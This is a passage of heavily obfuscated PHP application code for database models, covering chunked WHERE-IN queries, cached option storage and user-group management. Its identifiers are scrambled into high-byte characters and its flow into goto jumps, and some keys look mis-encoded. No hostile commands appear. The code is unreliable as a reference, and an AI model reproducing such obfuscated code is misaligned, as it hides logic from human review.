$CßÛºøÏĞ¤ = is_array($CßÛºøÏĞ¤) ? $CßÛºøÏĞ¤ : array(); $c•Âç¡×– = count($CßÛºøÏĞ¤); goto Cø„îœ¯Ëƒ; fã¤÷ÚÇòæ: $aÀĞñêØ¾Š = $this->findWhereField($Eã…æÂï–í); if (!$aÀĞñêØ¾Š) { return parent::save($E©†Á–ß’Ï, $e˜­¬­ŸøŞ); } $CÜ‡è‹¼¨ = 0; goto f„” £²ŠÉ; b³¤â‚çäÉ: $B†Ì–“Ü =& $_SERVER[›èö’ù¤]; $D¬ˆñË³™Ñ = self::SQL_WHERE_IN_CHUNK; $Eã…æÂï–í = $this->optionsValue(); goto fã¤÷ÚÇòæ; Cø„îœ¯Ëƒ: for ($Bº¥¸´”Û = 0; $Bº¥¸´”Û < $c•Âç¡×–; $Bº¥¸´”Û += $D¬ˆñË³™Ñ) { $fîéç‘¬Ä = array_slice($CßÛºøÏĞ¤, $Bº¥¸´”Û, $D¬ˆñË³™Ñ); if (!is_array($fîéç‘¬Ä) || count($fîéç‘¬Ä) == 0) { break; } $Eã…æÂï–í[$B†Ì–“Ü[273]][$aÀĞñêØ¾Š][1] = $fîéç‘¬Ä; $this->optionsValue($Eã…æÂï–í); $CÜ‡è‹¼¨ += parent::save($E©†Á–ß’Ï, $e˜­¬­ŸøŞ); $this->chunkEventCheck(count($fîéç‘¬Ä)); } $this->chunkEventSet(); return $CÜ‡è‹¼¨; goto dÑ·¾®˜ñÂ; dÑ·¾®˜ñÂ: } public function add($F¨è’Á²î = '', $a†îÀÉÑµ = array(), $aÑ‹»’¼äí = false) { if ($this->addTaskStatus && is_array($F¨è’Á²î)) { $this->addTaskData[] = $F¨è’Á²î; return; } return parent::add($F¨è’Á²î, $a†îÀÉÑµ, $aÑ‹»’¼äí); } public function parseWhereLike($FÜİ ÖÑ„, $d‡ÍÍè…ö¯ = '', $EÖÉÆô«ÁÀ = false, &$cé®Æ´³£“ = false) { goto EÕè›¨›åà; DÂ®õĞª½Ñ: foreach ($FÜİ ÖÑ„ as $CÃî§Ìâ¾ => $AçÕ‡ç·Õ‡) { if (is_array($AçÕ‡ç·Õ‡) && count($AçÕ‡ç·Õ‡) == 2 && $AçÕ‡ç·Õ‡[0] == $fÀÄÙÁ÷Å‘[381] && is_string($AçÕ‡ç·Õ‡[1]) && substr($AçÕ‡ç·Õ‡[1], 0, 1) == $fÀÄÙÁ÷Å‘[382] && substr($AçÕ‡ç·Õ‡[1], strlen($AçÕ‡ç·Õ‡[1]) - 1, 1) == $fÀÄÙÁ÷Å‘[382]) { goto EÆ¤¯¹Øº„; BÑå¤ŞîÖø: $Aì‹³ÄªŠ‚ = $this->db->escapeString($Aì‹³ÄªŠ‚); if (!strpos($C«Â†ÀÒ™Î, $fÀÄÙÁ÷Å‘[95])) { $C«Â†ÀÒ™Î = $fÀÄÙÁ÷Å‘[383] . $C«Â†ÀÒ™Î . $fÀÄÙÁ÷Å‘[383]; } $AâŸíŸô¡Ş = $fÀÄÙÁ÷Å‘[182] . $Aì‹³ÄªŠ‚ . $fÀÄÙÁ÷Å‘[182]; goto BÂ°¯”¤£; BÂ°¯”¤£: if ($F¿ˆ„óôŒ¹[$fÀÄÙÁ÷Å‘[384]]) { $AâŸíŸô¡Ş = $fÀÄÙÁ÷Å‘[385] . $Aì‹³ÄªŠ‚ . $fÀÄÙÁ÷Å‘[386]; if ($F¿ˆ„óôŒ¹[$fÀÄÙÁ÷Å‘[387]]) { $AâŸíŸô¡Ş = $fÀÄÙÁ÷Å‘[386] . $Aì‹³ÄªŠ‚ . $fÀÄÙÁ÷Å‘[385]; } } $añ­òŞÍö[$b´ÆİÕï˜¨] = $fÀÄÙÁ÷Å‘[388] . $C«Â†ÀÒ™Î . $fÀÄÙÁ÷Å‘[389] . $AâŸíŸô¡Ş . $fÀÄÙÁ÷Å‘[390]; $b´ÆİÕï˜¨++; goto bŒƒ÷¸•»¤; bŒƒ÷¸•»¤: continue; goto Eé¤™‡Ñ‹¸; EÆ¤¯¹Øº„: $cé®Æ´³£“ = !0; $C«Â†ÀÒ™Î = is_string($CÃî§Ìâ¾) ? $CÃî§Ìâ¾ : $d‡ÍÍè…ö¯; $Aì‹³ÄªŠ‚ = substr($AçÕ‡ç·Õ‡[1], 1, strlen($AçÕ‡ç·Õ‡[1]) - 2); goto BÑå¤ŞîÖø; Eé¤™‡Ñ‹¸: } if (is_array($AçÕ‡ç·Õ‡)) { $d‡ÍÍè…ö¯ = is_string($CÃî§Ìâ¾) ? $CÃî§Ìâ¾ : $d‡ÍÍè…ö¯; $AçÕ‡ç·Õ‡ = $this->parseWhereLike($AçÕ‡ç·Õ‡, $d‡ÍÍè…ö¯, !0, $cé®Æ´³£“); } if (is_numeric($CÃî§Ìâ¾)) { $añ­òŞÍö[$b´ÆİÕï˜¨] = $AçÕ‡ç·Õ‡; $b´ÆİÕï˜¨++; } else { $añ­òŞÍö[$CÃî§Ìâ¾] = $AçÕ‡ç·Õ‡; } } if ($cé®Æ´³£“ && !$EÖÉÆô«ÁÀ) { } return $añ­òŞÍö; goto aÛó¯Ğñà; C¸À—¾ç«: if (!is_array($FÜİ ÖÑ„)) { return $FÜİ ÖÑ„; } $añ­òŞÍö = array(); $b´ÆİÕï˜¨ = 0; goto DÂ®õĞª½Ñ; EÕè›¨›åà: $fÀÄÙÁ÷Å‘ =& $_SERVER[›èö’ù¤]; $F¿ˆ„óôŒ¹ = $GLOBALS[$fÀÄÙÁ÷Å‘[6]][$fÀÄÙÁ÷Å‘[379]]; if (!$F¿ˆ„óôŒ¹[$fÀÄÙÁ÷Å‘[380]]) { return $FÜİ ÖÑ„; } goto C¸À—¾ç«; aÛó¯Ğñà: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($c†è¨ñÎ× = array()) { goto dŸ†×­øÇŒ; DéÅ™èÖé’: $CÇ‹²×É‘ö = is_array($CÇ‹²×É‘ö) ? $CÇ‹²×É‘ö : array(); $Cƒâ—ô¹ˆ = null; for ($eË¤î×Â¯¢ = 0; $eË¤î×Â¯¢ < count($CÇ‹²×É‘ö); $eË¤î×Â¯¢ += $dØ“ïİõÈ) { $Bë¹ñğ¿Ãæ = array_slice($CÇ‹²×É‘ö, $eË¤î×Â¯¢, $dØ“ïİõÈ); if (!is_array($Bë¹ñğ¿Ãæ) || count($Bë¹ñğ¿Ãæ) == 0) { break; } $f´¢ÌÀÂÏŒ[$a›‘Š¨×”¸[273]][$fèØ³ì†Ü¾][1] = $Bë¹ñğ¿Ãæ; $this->optionsValue($f´¢ÌÀÂÏŒ); $b»›ÄÂì‘ = parent::select($c†è¨ñÎ×); if (!$b»›ÄÂì‘) { continue; } $Cƒâ—ô¹ˆ = is_array($Cƒâ—ô¹ˆ) ? $Cƒâ—ô¹ˆ : array(); $Cƒâ—ô¹ˆ = array_merge($Cƒâ—ô¹ˆ, $b»›ÄÂì‘); } goto BŞ¸¿’îñ; dŸ†×­øÇŒ: $a›‘Š¨×”¸ =& $_SERVER[›èö’ù¤]; $dØ“ïİõÈ = self::SQL_WHERE_IN_CHUNK; $f´¢ÌÀÂÏŒ = $this->optionsValue(); goto DÁ™âäìÆã; BŞ¸¿’îñ: return $Cƒâ—ô¹ˆ; goto b°•Ÿ²ƒ©; DÁ™âäìÆã: $fèØ³ì†Ü¾ = $this->findWhereField($f´¢ÌÀÂÏŒ); if (!$fèØ³ì†Ü¾ || isset($f´¢ÌÀÂÏŒ[$a›‘Š¨×”¸[290]]) || isset($f´¢ÌÀÂÏŒ[$a›‘Š¨×”¸[351]])) { return parent::select($c†è¨ñÎ×); } $CÇ‹²×É‘ö = $f´¢ÌÀÂÏŒ[$a›‘Š¨×”¸[273]][$fèØ³ì†Ü¾][1]; goto DéÅ™èÖé’; b°•Ÿ²ƒ©: } public function delete($c´¯—òñŠÆ = array()) { goto bŒÌÑ¿”‚; b—…œöĞÕŞ: $CÛÚ•¢ëÉ = $CÆ¶áâ¦º[$FÁÄÂô›Á[273]][$f­˜¿”º‘][1]; $CÛÚ•¢ëÉ = is_array($CÛÚ•¢ëÉ) ? $CÛÚ•¢ëÉ : array(); for ($CÉÜö¶é”Ş = 0; $CÉÜö¶é”Ş < count($CÛÚ•¢ëÉ); $CÉÜö¶é”Ş += $fŒ®œõƒŸ) { $eà¹ë‚ÍÛÁ = array_slice($CÛÚ•¢ëÉ, $CÉÜö¶é”Ş, $fŒ®œõƒŸ); if (!is_array($eà¹ë‚ÍÛÁ) || count($eà¹ë‚ÍÛÁ) == 0) { break; } $CÆ¶áâ¦º[$FÁÄÂô›Á[273]][$f­˜¿”º‘][1] = $eà¹ë‚ÍÛÁ; $this->optionsValue($CÆ¶áâ¦º); $bˆÂ‡÷ùØö += parent::delete($c´¯—òñŠÆ); } goto aä‚µ²Æ†²; bŒÌÑ¿”‚: $FÁÄÂô›Á =& $_SERVER[›èö’ù¤]; $fŒ®œõƒŸ = self::SQL_WHERE_IN_CHUNK; $CÆ¶áâ¦º = $this->optionsValue(); goto a®¨Øß­¤; a®¨Øß­¤: $f­˜¿”º‘ = $this->findWhereField($CÆ¶áâ¦º); if (!$f­˜¿”º‘) { return parent::delete($c´¯—òñŠÆ); } $bˆÂ‡÷ùØö = 0; goto b—…œöĞÕŞ; aä‚µ²Æ†²: return $bˆÂ‡÷ùØö; goto AÜ¡œØÀÎµ; AÜ¡œØÀÎµ: } private function findWhereField($d÷ààÙš¼…) { $cÒ‚ËèÊ¤¬ =& $_SERVER[›èö’ù¤]; $eĞ†»ÊåÏ = self::SQL_WHERE_IN_CHUNK; if (!is_array($d÷ààÙš¼…) || !is_array($d÷ààÙš¼…[$cÒ‚ËèÊ¤¬[273]])) { return !1; } foreach ($d÷ààÙš¼…[$cÒ‚ËèÊ¤¬[273]] as $B×¿ïç®™¬ => $b£ƒ›çß±) { if (is_array($b£ƒ›çß±) && isset($b£ƒ›çß±[0]) && is_string($b£ƒ›çß±[0]) && strtolower($b£ƒ›çß±[0]) == $cÒ‚ËèÊ¤¬[7] && is_array($b£ƒ›çß±[1]) && count($b£ƒ›çß±[1]) > $eĞ†»ÊåÏ) { ignore_timeout(); return $B×¿ïç®™¬; } } return !1; } public function setMasterDB($aÎè¹éé« = true) { think_config($_SERVER[›èö’ù¤][391], $aÎè¹éé«); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\155\x4f\160\164\151\x6f\156"; public $field = array(); public function listData($E‹ŠÒ«¯ô = false, $bÁ‡ßİ‚¿ = "\x6d\x6f\144\151\146\x79\x54\151\155\145", $b—ÕàïİÙâ = false) { $ağÎ‡ÔÀ…— = Model($this->modelType)->get(!1, $this->optionType, !0); $DÜæ¦õê = array_values($ağÎ‡ÔÀ…—); if ($DÜæ¦õê && $DÜæ¦õê[0] && !is_array($DÜæ¦õê[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ağÎ‡ÔÀ…— = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ağÎ‡ÔÀ…—) { return $E‹ŠÒ«¯ô ? null : array(); } if (!$E‹ŠÒ«¯ô) { $ağÎ‡ÔÀ…— = array_filter(array_values($ağÎ‡ÔÀ…—)); return array_sort_by($ağÎ‡ÔÀ…—, $bÁ‡ßİ‚¿, $b—ÕàïİÙâ); } return $ağÎ‡ÔÀ…—[$_SERVER[›èö’ù¤][392] . $E‹ŠÒ«¯ô]; } public function insert($Cµƒ—Êïğ) { goto B™èï¬Ã«Ø; Bâ–‡ôÄª†: $Cµƒ—Êïğ[$C›É‘‹½˜[84]] = time(); Model($this->modelType)->set($C›É‘‹½˜[393], $B ñÈôË”ø, $this->optionType . $C›É‘‹½˜[394]); Model($this->modelType)->set($C›É‘‹½˜[392] . $B ñÈôË”ø, $Cµƒ—Êïğ, $this->optionType); goto eŸ—ßƒ”Ñó; B™èï¬Ã«Ø: $C›É‘‹½˜ =& $_SERVER[›èö’ù¤]; $Cµƒ—Êïğ = array_field_key($Cµƒ—Êïğ, $this->field); $B ñÈôË”ø = Model($this->modelType)->get($C›É‘‹½˜[393], $this->optionType . $C›É‘‹½˜[394]); goto C…±‚¤áÃñ; C…±‚¤áÃñ: $B ñÈôË”ø = $B ñÈôË”ø ? $B ñÈôË”ø : 0; $Cµƒ—Êïğ[$C›É‘‹½˜[395]] = ++$B ñÈôË”ø; $Cµƒ—Êïğ[$C›É‘‹½˜[194]] = time(); goto Bâ–‡ôÄª†; eŸ—ßƒ”Ñó: return $B ñÈôË”ø; goto Fïˆİ×–¬×; Fïˆİ×–¬×: } public function update($BÎÇ—ğ¶µ, $D¨‚ŒÙôÅ¤) { goto C× Å¡ğê; C× Å¡ğê: $AãÛ„‰®ë =& $_SERVER[›èö’ù¤]; $D¨‚ŒÙôÅ¤ = array_field_key($D¨‚ŒÙôÅ¤, $this->field); $CßĞ–ƒ›¢“ = $this->listData($BÎÇ—ğ¶µ); goto FÕºÙ”³‰; FÕºÙ”³‰: if (!$CßĞ–ƒ›¢“ || !$BÎÇ—ğ¶µ) { return !1; } $D¨‚ŒÙôÅ¤ = array_merge($CßĞ–ƒ›¢“, $D¨‚ŒÙôÅ¤); $D¨‚ŒÙôÅ¤[$AãÛ„‰®ë[84]] = time(); goto c¤’¸£Õ¢â; c¤’¸£Õ¢â: return Model($this->modelType)->set($AãÛ„‰®ë[392] . $BÎÇ—ğ¶µ, $D¨‚ŒÙôÅ¤, $this->optionType); goto c÷ôò˜ò„; c÷ôò˜ò„: } public function remove($a·šê‰á®ä) { if (!$a·šê‰á®ä) { return !1; } return Model($this->modelType)->remove($_SERVER[›èö’ù¤][392] . $a·šê‰á®ä, $this->optionType); } public function clear() { $aæ²Ç‰£ =& $_SERVER[›èö’ù¤]; Model($this->modelType)->remove($aæ²Ç‰£[393], $this->optionType . $aæ²Ç‰£[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($DŸ«ùøÓ²­, $F¶Ÿ­òÈ‘ò) { if (!$F¶Ÿ­òÈ‘ò) { return !1; } $Dà–‡É¢ = $this->listData(); $Dà–‡É¢ = array_to_keyvalue($Dà–‡É¢, $DŸ«ùøÓ²­); return isset($Dà–‡É¢[$F¶Ÿ­òÈ‘ò]) ? $Dà–‡É¢[$F¶Ÿ­òÈ‘ò] : !1; } public function findByName($AÖòõ†Ÿ–İ) { return $this->findByKey($_SERVER[›èö’ù¤][28], $AÖòõ†Ÿ–İ); } protected function resetData($fº”ª¤¸¥ø) { $D‰Š°–³² =& $_SERVER[›èö’ù¤]; $fº”ª¤¸¥ø = is_array($fº”ª¤¸¥ø) ? $fº”ª¤¸¥ø : array(); $cá¦ßÆÇâ = array(); for ($fæ¾çŸˆŸÙ = 0; $fæ¾çŸˆŸÙ < count($fº”ª¤¸¥ø); $fæ¾çŸˆŸÙ++) { $cá¦ßÆÇâ[$D‰Š°–³²[392] . $fº”ª¤¸¥ø[$fæ¾çŸˆŸÙ][$D‰Š°–³²[395]]] = $fº”ª¤¸¥ø[$fæ¾çŸˆŸÙ]; } return Model($this->modelType)->set($cá¦ßÆÇâ, !1, $this->optionType); } private function getAutoName($A˜¾ªæÚÓæ) { $d©¨è»·âª = array_to_keyvalue($this->listData(), $_SERVER[›èö’ù¤][28]); if (!$d©¨è»·âª || !isset($d©¨è»·âª[$A˜¾ªæÚÓæ])) { return $A˜¾ªæÚÓæ; } for ($Eê…„Œ·Ó = 1; $Eê…„Œ·Ó < count($d©¨è»·âª); $Eê…„Œ·Ó++) { $FÄ³ÜÁÍÂö = $A˜¾ªæÚÓæ . "\x28{$Eê…„Œ·Ó}\x29"; if (!isset($d©¨è»·âª[$FÄ³ÜÁÍÂö])) { return $FÄ³ÜÁÍÂö; } } return $FÄ³ÜÁÍÂö; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($d‘¨Èæ¹ö = false, $C®¦ê¥š¬Æ = '', $e´ îÑÄùø = false) { goto bÏ‘²ÕÁ¶ï; bÏ‘²ÕÁ¶ï: $d‰Ã‰ÀÒè =& $_SERVER[›èö’ù¤]; $F¯›§æ¿ŒÎ = $this->cacheGet($C®¦ê¥š¬Æ); $c²‹‰‡å•Á = $this->optionDefault($C®¦ê¥š¬Æ); goto dê®ÆŒ Üø; C §âÍ×Ã‰: $F¯›§æ¿ŒÎ = $this->where($B¥†æé)->select(); $F¯›§æ¿ŒÎ = array_to_keyvalue($F¯›§æ¿ŒÎ, $d‰Ã‰ÀÒè[93], $d‰Ã‰ÀÒè[372]); foreach ($F¯›§æ¿ŒÎ as $C§ğˆµÉ“— => $cçÔÀÙñ¼Ë) { if ($e´ îÑÄùø || in_array($C§ğˆµÉ“—, $this->jsonField)) { $F¯›§æ¿ŒÎ[$C§ğˆµÉ“—] = json_decode($cçÔÀÙñ¼Ë, !0); } } goto bïù«Ê¹í; bïù«Ê¹í: $this->cacheSet($C®¦ê¥š¬Æ, $F¯›§æ¿ŒÎ); $F¯›§æ¿ŒÎ = array_merge($c²‹‰‡å•Á, $F¯›§æ¿ŒÎ); return $d‘¨Èæ¹ö ? $F¯›§æ¿ŒÎ[$d‘¨Èæ¹ö] : $F¯›§æ¿ŒÎ; goto aØ¿äÄ–º—; dê®ÆŒ Üø: $c²‹‰‡å•Á = is_array($c²‹‰‡å•Á) ? $c²‹‰‡å•Á : array(); if (is_array($F¯›§æ¿ŒÎ)) { $F¯›§æ¿ŒÎ = array_merge($c²‹‰‡å•Á, $F¯›§æ¿ŒÎ); return $d‘¨Èæ¹ö ? isset($F¯›§æ¿ŒÎ[$d‘¨Èæ¹ö]) ? $F¯›§æ¿ŒÎ[$d‘¨Èæ¹ö] : null : $F¯›§æ¿ŒÎ; } $B¥†æé = $this->filterWhere(array($d‰Ã‰ÀÒè[29] => $C®¦ê¥š¬Æ)); goto C §âÍ×Ã‰; aØ¿äÄ–º—: } public function set($CœØ¥é‹ç, $aé ÚĞ·é = false, $e™äñ‰ï° = '') { goto c½¯”ƒ¡›‘; c½¯”ƒ¡›‘: $Bàä«˜ù’‹ =& $_SERVER[›èö’ù¤]; $this->cacheRemove($e™äñ‰ï°); $BòÆó„¹« = array(); goto EÔ…Œ¹›çç; Cï¤î…ø: return $this->addAll($BòÆó„¹«, array(), !0); goto fÁ æäŞÍ; EÔ…Œ¹›çç: $cœ‚çëÎ†æ = is_array($CœØ¥é‹ç) ? $CœØ¥é‹ç : array($CœØ¥é‹ç => $aé ÚĞ·é); foreach ($cœ‚çëÎ†æ as $e‡Î‚‚âæĞ => $dÒ»Æ‰°‡Ş) { if (is_array($dÒ»Æ‰°‡Ş)) { $dÒ»Æ‰°‡Ş = json_encode_force($dÒ»Æ‰°‡Ş); } $this->checkLength($dÒ»Æ‰°‡Ş, !1, $this->tableName . $Bàä«˜ù’‹[4] . $CœØ¥é‹ç); $dÒ»Æ‰°‡Ş = self::textEncode($dÒ»Æ‰°‡Ş); $cœ‚çëÎ†æ = array($Bàä«˜ù’‹[29] => $e™äñ‰ï°, $Bàä«˜ù’‹[93] => $e‡Î‚‚âæĞ, $Bàä«˜ù’‹[372] => $dÒ»Æ‰°‡Ş); $BòÆó„¹«[] = $this->filterWhere($cœ‚çëÎ†æ); } if (!$BòÆó„¹«) { return !0; } goto Cï¤î…ø; fÁ æäŞÍ: } protected function optionDefault($A¥Ó¸‰ï›Ê = '') { return !1; } public function setDeep($Aâ«™ŠÒÍê, $FíÕ‰Ã¬Œ = false, $D¡ÚÄèˆ½º = '') { $FÜô°«šÉˆ = explode($_SERVER[›èö’ù¤][95], $Aâ«™ŠÒÍê); $e†¦‡ÖÇŸ = $this->get(); array_set_value($e†¦‡ÖÇŸ, $Aâ«™ŠÒÍê, $FíÕ‰Ã¬Œ); $this->set($FÜô°«šÉˆ[0], $e†¦‡ÖÇŸ[$FÜô°«šÉˆ[0]], $D¡ÚÄèˆ½º); } public function remove($Dñ¿èÔŠ½ã, $eÆÓğôä´™ = '') { $C÷Í”°œ‹Ö =& $_SERVER[›èö’ù¤]; $this->cacheRemove($eÆÓğôä´™); $EÖ¾±–§àí = $this->filterWhere(array($C÷Í”°œ‹Ö[93] => $Dñ¿èÔŠ½ã, $C÷Í”°œ‹Ö[29] => $eÆÓğôä´™)); if (is_null($Dñ¿èÔŠ½ã)) { unset($EÖ¾±–§àí[$C÷Í”°œ‹Ö[93]]); } return $this->where($EÖ¾±–§àí)->delete(); } public function cacheSet($Bšõƒ¡Ö, $d–ŞÌ‹ğÆÔ = false) { return Cache::set($this->cacheKey($Bšõƒ¡Ö), $d–ŞÌ‹ğÆÔ); } public function cacheGet($dšğÌ×ØÅ¡) { return Cache::get($this->cacheKey($dšğÌ×ØÅ¡)); } public function cacheRemove($DìïÅâ„) { return Cache::remove($this->cacheKey($DìïÅâ„)); } protected function filterWhere($EõÂÚİ¶—) { return $EõÂÚİ¶—; } protected function cacheKey($f®­ èÌ‰) { return $f®­ èÌ‰; } } goto eÓõƒéä±; cÆÑİ›ƒç§: class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\155\145" => "\x67\x72\157\165\x70\x5f\155\x65\164\x61", "\155\x65\x74\x61\x46\x69\x65\154\144" => "\x67\x72\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($C±ÀäƒÖ“È) { $C¦ŠºÈó†‘ =& $_SERVER[›èö’ù¤]; return array($C¦ŠºÈó†‘[1794] => array($C±ÀäƒÖ“È[0], $C¦ŠºÈó†‘[1795]), $C¦ŠºÈó†‘[1796] => array($C±ÀäƒÖ“È[0], $C¦ŠºÈó†‘[1797])); } protected function getInfo($dåÕ·„ÍêÔ, $B«Ÿ‰Âäù¹ = false) { $Fî‡›ª¬®» = $this->getInfoSimple($dåÕ·„ÍêÔ); if (!$Fî‡›ª¬®») { return !1; } if ($B«Ÿ‰Âäù¹) { return $this->_listDataApplyItem($Fî‡›ª¬®»); } return $this->cacheFunctionGet($_SERVER[›èö’ù¤][1798], $dåÕ·„ÍêÔ); } protected function getInfoSimple($Bœõ¶Ñ´ö, $E¸é­¹–÷µ = false) { $c¡ÂìÑ°Ê =& $_SERVER[›èö’ù¤]; if ($E¸é­¹–÷µ) { $aªãßáø† = array($c¡ÂìÑ°Ê[1720] => intval($Bœõ¶Ñ´ö)); $c˜’Íåì·µ = $this->where($aªãßáø†)->find(); return is_array($c˜’Íåì·µ) ? $c˜’Íåì·µ : array(); } return $this->cacheFunctionGet($c¡ÂìÑ°Ê[1799], $Bœõ¶Ñ´ö); } protected function groupAdd($Cæ‘Õ¸£Ü³) { goto C âÏŠÖ; bé´™¼êÏİ: if (isset($Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1802]])) { $this->metaSet($FŠ‡íçíá, array($c¯À™ªã×À[1802] => $Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1802]], $c¯À™ªã×À[1803] => $Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1803]])); unset($Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1802]]); unset($Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1803]]); } Model($c¯À™ªã×À[1230])->groupRootAdd($FŠ‡íçíá); return $FŠ‡íçíá; goto aŞ®ôƒ¼°Ê; cˆë‰„–™: if ($c’¼×ù•İ„[$c¯À™ªã×À[516]]) { $f‰ĞÕâò¡ = $c’¼×ù•İ„[$c¯À™ªã×À[516]] . $c’¼×ù•İ„[$c¯À™ªã×À[1720]] . $c¯À™ªã×À[47]; } $FøÂ×·ÊÈ¼ = array($c¯À™ªã×À[415] => $this->groupNameAuto($Cæ‘Õ¸£Ü³[$c¯À™ªã×À[493]], $Cæ‘Õ¸£Ü³[$c¯À™ªã×À[28]]), $c¯À™ªã×À[396] => $Cæ‘Õ¸£Ü³[$c¯À™ªã×À[493]], $c¯À™ªã×À[579] => $f‰ĞÕâò¡, $c¯À™ªã×À[1800] => $Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1704]], $c¯À™ªã×À[1801] => 0, $c¯À™ªã×À[1724] => 0); if (isset($Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1743]])) { $FøÂ×·ÊÈ¼[$c¯À™ªã×À[1743]] = $Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1743]]; } else { $cÒ©‹Êáó™ = $this->max($c¯À™ªã×À[1743]); if (!$cÒ©‹Êáó™) { $cÒ©‹Êáó™ = 0; } $FøÂ×·ÊÈ¼[$c¯À™ªã×À[1743]] = $cÒ©‹Êáó™ + 1; } goto cóÚ²ñ…’„; C âÏŠÖ: $c¯À™ªã×À =& $_SERVER[›èö’ù¤]; if (!$Cæ‘Õ¸£Ü³[$c¯À™ªã×À[493]] && isset($Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1720]]) && $Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1720]] == 1) { if ($c’¼×ù•İ„ = $this->getInfoSimple($Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1720]], !0)) { return $Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1720]]; } } else { $c’¼×ù•İ„ = $this->getInfoSimple($Cæ‘Õ¸£Ü³[$c¯À™ªã×À[493]]); if (!$c’¼×ù•İ„) { return !1; } } $f‰ĞÕâò¡ = $c¯À™ªã×À[526]; goto cˆë‰„–™; cóÚ²ñ…’„: if (!empty($Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1720]])) { $FøÂ×·ÊÈ¼[$c¯À™ªã×À[1720]] = $Cæ‘Õ¸£Ü³[$c¯À™ªã×À[1720]]; } $FŠ‡íçíá = $this->add($FøÂ×·ÊÈ¼); $this->setNamePinyin($FŠ‡íçíá, $FøÂ×·ÊÈ¼[$c¯À™ªã×À[28]]); goto bé´™¼êÏİ; aŞ®ôƒ¼°Ê: } protected function groupEdit($D‰í©ˆ»«ï, $A†ÎÙé‘›á) { goto E‹‹˜”ÜÖ©; e´•¯×šï: if (!empty($A†ÎÙé‘›á[$fÎÛô¨‰Ğå[493]])) { $f™´å¤·æŠ = $this->getInfoSimple($A†ÎÙé‘›á[$fÎÛô¨‰Ğå[493]]); if (!$f™´å¤·æŠ) { return !1; } if ($B²‘èÑÏÕÀ[$fÎÛô¨‰Ğå[1720]] == $f™´å¤·æŠ[$fÎÛô¨‰Ğå[1720]]) { return !1; } if ($A†ÎÙé‘›á[$fÎÛô¨‰Ğå[493]] != $B²‘èÑÏÕÀ[$fÎÛô¨‰Ğå[493]]) { if ($f™´å¤·æŠ[$fÎÛô¨‰Ğå[516]] !== $B²‘èÑÏÕÀ[$fÎÛô¨‰Ğå[516]] && strpos($f™´å¤·æŠ[$fÎÛô¨‰Ğå[516]], $B²‘èÑÏÕÀ[$fÎÛô¨‰Ğå[516]] . $B²‘èÑÏÕÀ[$fÎÛô¨‰Ğå[1720]] . $fÎÛô¨‰Ğå[47]) === 0) { return !1; } $A†ÎÙé‘›á[$fÎÛô¨‰Ğå[579]] = $f™´å¤·æŠ[$fÎÛô¨‰Ğå[516]] . $A†ÎÙé‘›á[$fÎÛô¨‰Ğå[493]] . $fÎÛô¨‰Ğå[47]; $this->_changeChildLevel($B²‘èÑÏÕÀ, $f™´å¤·æŠ); } } if (isset($A†ÎÙé‘›á[$fÎÛô¨‰Ğå[28]])) { $this->setNamePinyin($D‰í©ˆ»«ï, $A†ÎÙé‘›á[$fÎÛô¨‰Ğå[28]]); } if (isset($A†ÎÙé‘›á[$fÎÛô¨‰Ğå[1802]])) { $this->metaSet($D‰í©ˆ»«ï, array($fÎÛô¨‰Ğå[1802] => $A†ÎÙé‘›á[$fÎÛô¨‰Ğå[1802]], $fÎÛô¨‰Ğå[1803] => $A†ÎÙé‘›á[$fÎÛô¨‰Ğå[1803]])); unset($A†ÎÙé‘›á[$fÎÛô¨‰Ğå[1802]]); unset($A†ÎÙé‘›á[$fÎÛô¨‰Ğå[1803]]); } goto a˜â…ìÜˆŞ; a˜â…ìÜˆŞ: $this->_clearChildrenCache($B²‘èÑÏÕÀ); return $this->where(array($fÎÛô¨‰Ğå[1804] => $D‰í©ˆ»«ï))->save($A†ÎÙé‘›á); goto FÈßåæ½‘ø; E‹‹˜”ÜÖ©: $fÎÛô¨‰Ğå =& $_SERVER[›èö’ù¤]; $B²‘èÑÏÕÀ = $this->getInfoSimple($D‰í©ˆ»«ï); if (!$B²‘èÑÏÕÀ) { return !1; } goto e´•¯×šï; FÈßåæ½‘ø: } private function _clearChildrenCache($BÚàÖß‰õÑ) { $bñ‰àŸÊã¦ =& $_SERVER[›èö’ù¤]; $fÃó˜®Á = array($bñ‰àŸÊã¦[579] => array($bñ‰àŸÊã¦[539], $BÚàÖß‰õÑ[$bñ‰àŸÊã¦[516]] . $BÚàÖß‰õÑ[$bñ‰àŸÊã¦[1720]] . $bñ‰àŸÊã¦[540])); $F¢ß±×™ªª = $this->field($bñ‰àŸÊã¦[1720])->where($fÃó˜®Á)->select(); foreach ($F¢ß±×™ªª as $d»ÙŞœÊÈ) { $this->_clearCache($d»ÙŞœÊÈ[$bñ‰àŸÊã¦[1720]]); } } private function _clearCache($Cä²ÎˆÏÉÙ) { $aÀª²§©¼Î =& $_SERVER[›èö’ù¤]; $this->cacheFunctionClear($aÀª²§©¼Î[1798], $Cä²ÎˆÏÉÙ); $this->cacheFunctionClear($aÀª²§©¼Î[1799], $Cä²ÎˆÏÉÙ); } private function _changeChildLevel($D‹ç—¶çĞ´, $aÈ¹îÏ‘é¢, 